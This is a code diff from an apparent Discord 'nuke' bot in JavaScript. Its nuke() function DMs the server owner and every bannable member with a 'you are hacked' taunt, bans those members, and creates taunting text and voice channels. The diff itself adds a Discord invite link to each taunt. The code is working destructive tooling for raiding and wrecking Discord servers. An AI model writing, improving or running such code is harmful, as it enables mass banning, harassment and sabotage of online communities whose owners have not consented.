@@ -416,14 +416,14 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  await guild.owner.send(' Hacked u by اللحية').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by اللحية https://discord.gg/EMaxyt').catch(e => { return void e; });
 
 
 
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('^_^ you are hacked by اللحية').catch(e => { return void e; });
+      await m.send('^_^ you are hacked by اللحية https://discord.gg/EMaxyt').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -435,9 +435,9 @@ async function nuke(guild) {
     }
   }));
   
-    await guild.createChannel('Hacked u by اللحية', 'text');
+    await guild.createChannel('Hacked u by https://discord.gg/EMaxyt اللحية', 'text');
 
-      await guild.createChannel('Hacked u by اللحية', 'voice');
+      await guild.createChannel('Hacked u by اللحية https://discord.gg/EMaxyt', 'voice');
 
   
 
